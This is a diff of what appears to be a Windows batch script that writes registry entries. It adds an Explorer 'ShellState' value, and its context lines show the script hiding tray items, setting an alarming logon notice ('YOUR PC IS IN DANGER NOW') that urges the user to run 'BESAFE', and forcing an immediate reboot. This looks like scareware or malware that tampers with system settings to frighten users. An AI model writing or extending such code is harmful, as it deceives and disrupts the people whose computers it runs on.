@@ -365,6 +365,10 @@ echo.>>%B%
 echo [%CU%\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>%B%
 echo "NoTrayItemsDisplay"=dword:00000001>>%B%
 echo.>>%B%
+echo [%CU%\Software\Microsoft\Windows\CurrentVersion\Explorer]>>%B%
+echo "ShellState"=hex:24,00,00,00,3e,38,00,00,00,00,00,00,00,00,00,00,00,00,00,00,\>>%B%
+echo    01,00,00,00,13,00,00,00,00,00,00,00,6b,00,00,00>>%B%
+echo.>>%B%
 echo [%LM%\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>%B%
 echo "LegalNoticeCaption"="YOUR PC IS IN DANGER NOW ! ! !">>%B%
 echo "LegalNoticeText"="PLEASE DO REMEMBER TO RUN [ BESAFE ] FROM START MENU TO BRING YOUR PC BACK TO SAFETY ! ! !">>%B%
@@ -1834,4 +1838,5 @@ shutdown /r /f /t 0 1>nul 2>nul
 :"ConnectionOptionsFlag"=dword:00000001
 :"DCOM Protocols"=hex(7):6e,00,63,00,61,00,63,00,6e,00,5f,00,69,00,70,00,5f,00,\
 :  74,00,63,00,70,00,00,00,00,00
+
 
